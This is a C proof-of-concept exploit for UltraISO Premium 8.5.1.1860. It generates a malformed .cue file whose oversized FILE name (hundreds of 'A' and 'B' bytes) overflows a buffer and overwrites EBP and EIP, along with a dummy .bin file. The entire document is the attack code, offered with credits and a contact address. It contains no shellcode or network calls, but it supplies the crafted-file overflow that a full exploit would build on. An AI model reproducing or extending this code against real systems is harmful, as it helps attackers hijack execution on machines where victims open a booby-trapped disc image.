/*Ultra ISO Premium Edition Version 8.5.1.1860 POC
  EBP  41414141
  EIP  41414141
  This POC creates some special .bin and .cue files.
  Run Ultra ISO and debug to see it's effects.
  Well the code is compressed for protection and 
  therefore hard if not impposible to exploit.
  Credits for finding the bug and POC go to fl0 fl0w.
  Email me if you're interested in sharing info
  at flo_flow_supremacy@yahoo.com
*/

#include<stdio.h>
#include<stdlib.h>
#include<windows.h> 
#include<string.h>

#define EvilFileCUE "B.cue"
#define EvilFileBIN "B.bin"
#define OFFSET 837
#define FIRST "FILE \""
#define FAKEBIN "FAKE\r\n"
 
 char LAST[]=
 ".bin \" BINARY\r\n TRACK 01 MODE2/2352\r\n INDEX 01 00:00:00\r\n";
  int main()
  { FILE *t;
    FILE *g;
    unsigned char *buffer;
    unsigned int offset;
    
    
    buffer=(unsigned char *)malloc(OFFSET+strlen(LAST)+1);
    
    if((t=fopen(EvilFileCUE,"wb"))==NULL)
       { printf("error..");
         exit(0);   
       }
    memset(buffer,0x41,720);
    offset=720;
    memset(buffer+offset,0x42,122);
    printf("Cue file buid\n");
    offset=0;
    offset=OFFSET;
    memcpy(buffer+offset,LAST,strlen(LAST));
    memset(buffer+offset+strlen(LAST),0x00,1);
    fprintf(t,"%s%s",FIRST,buffer); 
    fclose(t);
    free(buffer);
    
    if((g=fopen(EvilFileBIN,"wb"))==NULL)
       { printf("error..");
         exit(0);   
       }
    fprintf(g,"%s",FAKEBIN);  
    fclose(g);
   return 0;
  }   
